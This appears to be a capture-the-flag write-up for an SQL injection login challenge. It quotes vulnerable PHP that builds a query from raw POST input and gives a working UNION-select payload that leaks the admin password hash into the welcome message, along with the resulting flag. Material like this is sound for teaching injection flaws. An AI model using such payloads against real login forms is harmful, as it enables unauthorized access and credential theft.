# [SQL Injection Level 3](http://s1063.vdi.mipt.ru:8000/challenges#SQL%20Injection%20Level%203)
### [Login form](http://chall1.ctf.pwne.xyz:5555/level3/)

# Solution
1. Analyze the code
```php
$query = "SELECT * FROM users WHERE username='{$_POST['username']}' AND password='{$_POST['password']}'";

if (mysqli_num_rows($result) == 1)
{
	$row = $result->fetch_assoc();
	$username = $row['username'];
	$greeting = "Welcome, {$username}";
	$success_page = sprintf($success_page, $greeting);
	echo $success_page;
}
```
2. Let's do the same thing as in the first task.
3. We get `Your flag is flag{admin_password_here}`, so we need to retrieve admin's password.
4. We can see that after login in greeting message there is our username.
5. Let's change username with password.
login: `' union select id, password as username, username as login from users where username='admin';#`
We get: `Welcome, 0314fe52027a16cbdbc6af5c396cb658`, so

**Answer**: `flag{0314fe52027a16cbdbc6af5c396cb658}`